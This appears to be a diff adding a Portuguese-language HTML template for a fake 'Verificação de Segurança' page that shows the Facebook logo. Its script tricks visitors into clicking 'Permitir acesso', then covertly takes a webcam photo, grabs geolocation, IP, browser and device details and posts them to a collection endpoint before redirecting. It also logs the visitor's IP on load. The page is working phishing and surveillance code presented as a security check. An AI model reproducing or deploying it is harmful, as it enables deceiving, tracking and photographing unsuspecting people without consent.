@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificação de Segurança</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #f9fafb;
+      color: #111827;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.08);
+      padding: 32px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 60px;
+      margin-bottom: 16px;
+    }
+
+    h2 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    p {
+      font-size: 15px;
+      color: #6b7280;
+      margin-bottom: 24px;
+    }
+
+    .button {
+      background-color: #2563eb;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .button:hover {
+      background-color: #1d4ed8;
+    }
+
+    #mensagem {
+      font-size: 14px;
+      color: #374151;
+      margin-top: 16px;
+      font-weight: bold;
+    }
+
+    .loading {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #6b7280;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #2563eb;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 8px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="logo" class="logo">
+
+    <h2>Verificação de Segurança</h2>
+    <p>Por favor, confirme sua identidade para continuar.</p>
+
+    <button id="permitir" class="button">Permitir acesso</button>
+    <p id="mensagem"></p>
+
+    <div class="loading" id="loading" style="display:none;">
+      <div class="spinner"></div>
+      Verificando informações...
+    </div>
+  </div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const slug = {{ slug | tojson | safe }};
+    const destino = {{ destino | tojson | safe }};
+    const inicioTempo = Date.now();
+
+    const coletarInfoBrowser = async () => {
+      const userAgent = navigator.userAgent;
+      const idioma = navigator.language;
+      const fusoHorario = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const larguraTela = window.screen.width;
+      const alturaTela = window.screen.height;
+      const plataforma = navigator.platform;
+      const conexao = (navigator.connection || {}).effectiveType || "indisponível";
+
+      let ip = "indefinido";
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipJson = await ipRes.json();
+        ip = ipJson.ip;
+      } catch (e) {
+        console.warn("IP não obtido:", e);
+      }
+
+      return {
+        userAgent,
+        idioma,
+        fusoHorario,
+        larguraTela,
+        alturaTela,
+        plataforma,
+        conexao,
+        ip
+      };
+    };
+
+    const coletarDados = async () => {
+      document.getElementById("loading").style.display = "block";
+      let latitude = "", longitude = "", foto_base64 = "";
+
+      try {
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 }));
+        latitude = pos.coords.latitude;
+        longitude = pos.coords.longitude;
+      } catch (e) {
+        console.warn("Geolocalização negada ou falhou.");
+      }
+
+      try {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+        video.srcObject = stream;
+        await new Promise(r => setTimeout(r, 2000));
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        foto_base64 = canvas.toDataURL("image/png");
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        console.warn("Câmera negada ou falhou.");
+      }
+
+      const infosBrowser = await coletarInfoBrowser();
+      const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);
+
+      const payload = {
+        slug,
+        latitude,
+        longitude,
+        foto_base64,
+        tempoSegundos,
+        ...infosBrowser
+      };
+
+      try {
+        const res = await fetch("/coletar_dados", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        const json = await res.json();
+        window.location.href = json.destino;
+      } catch (e) {
+        console.error("Erro ao enviar dados:", e);
+        document.getElementById("mensagem").innerText = "Erro ao processar.";
+      }
+    };
+
+    document.getElementById("permitir").addEventListener("click", coletarDados);
+
+    // IP inicial
+    (async () => {
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipJson = await ipRes.json();
+        await fetch("/coletar_ip_inicial", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ slug, ip: ipJson.ip })
+        });
+      } catch (e) {
+        console.warn("Erro ao capturar IP inicial:", e);
+      }
+    })();
+  </script>
+</body>
+</html>
